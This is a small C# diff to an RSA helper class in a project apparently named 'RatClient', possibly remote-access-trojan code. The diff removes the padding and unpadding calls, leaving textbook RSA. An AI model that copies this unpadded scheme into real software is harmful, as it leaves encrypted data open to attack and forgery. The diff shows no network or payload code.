@@ -1,10 +1,10 @@
-﻿
+﻿using System;
 using System.Numerics;
-
+using System.Linq;
 
 namespace RatClient.AcRSA
 {
-    public static class RSA
+    class ACRSA 
     {
         public static Tuple<BigInteger[], BigInteger[]> GenFullKey(int nbit)
         {
@@ -32,7 +32,8 @@ namespace RatClient.AcRSA
 
         public static byte[] Encrypt(byte[] msg, BigInteger[] pubkey)
         {
-            BigInteger m = BitConvert.FromBytes(padding(msg, pubkey[1]));
+            // BigInteger m = BitConvert.FromBytes(padding(msg, pubkey[1]));
+            BigInteger m = BitConvert.FromBytes(msg);
             BigInteger enc = _encrypt(m, pubkey);
             return BitConvert.ToBytes(enc);
         }
@@ -40,7 +41,8 @@ namespace RatClient.AcRSA
         {
             BigInteger m = BitConvert.FromBytes(encryptedMsg);
             BigInteger dec = _decrypt(m, prvtkey);
-            return unpading(BitConvert.ToBytes(dec));
+            // return unpading(BitConvert.ToBytes(dec));
+            return BitConvert.ToBytes(dec);
         }
 
         public static byte[] Gethash(string algo, byte[] data)
